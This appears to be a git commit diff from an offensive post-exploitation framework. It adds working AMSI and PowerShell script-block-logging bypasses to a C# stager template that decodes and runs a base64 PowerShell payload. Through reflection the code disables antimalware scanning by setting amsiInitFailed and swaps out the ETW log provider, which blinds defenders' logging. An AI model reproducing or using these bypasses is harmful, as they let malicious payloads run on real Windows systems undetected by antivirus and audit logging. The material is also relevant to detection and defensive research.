e9a3726e73135b126ec9f3d2e0df35169652d091
Philippe Pepos Petitclerc <ppeposp@gmail.com>
2018-10-14 13:01:37 -0400

    Add Amsi and SBL bypasses to the CSharp stager.
    The bypasses are the same ones used in the powershell launcher.

--- data/misc/cSharpTemplateResources/cmd/cmd/Program.cs
+++ data/misc/cSharpTemplateResources/cmd/cmd/Program.cs
@@ -8,6 +8,7 @@
  */
 using System;
 using System.Text;
+using System.Reflection;
 using System.Management.Automation; 
 using System.Management.Automation.Runspaces; 
 
@@ -17,6 +18,8 @@ namespace cmd
 	{
 		public static void Main(string[] args)
 		{
+            BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
+
 			string stager = " YOUR CODE GOES HERE";
 			var decodedScript = Encoding.Unicode.GetString(Convert.FromBase64String(stager));
 
@@ -25,10 +28,25 @@ namespace cmd
             RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
             Pipeline pipeline = runspace.CreatePipeline();
 
+            var PSEtwLogProvider = pipeline.Commands.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
+            if (PSEtwLogProvider != null)
+            {
+                var EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags);
+                var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
+                EtwProvider.SetValue(null, EventProvider);
+            }
+
+            var amsiUtils = pipeline.Commands.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
+            if (amsiUtils != null)
+            {
+                amsiUtils.GetField("amsiInitFailed", flags).SetValue(null, true);
+            }
+
             pipeline.Commands.AddScript(decodedScript);
 
             pipeline.Commands.Add("Out-Default");
             pipeline.Invoke();
+
         }
 	}
 }
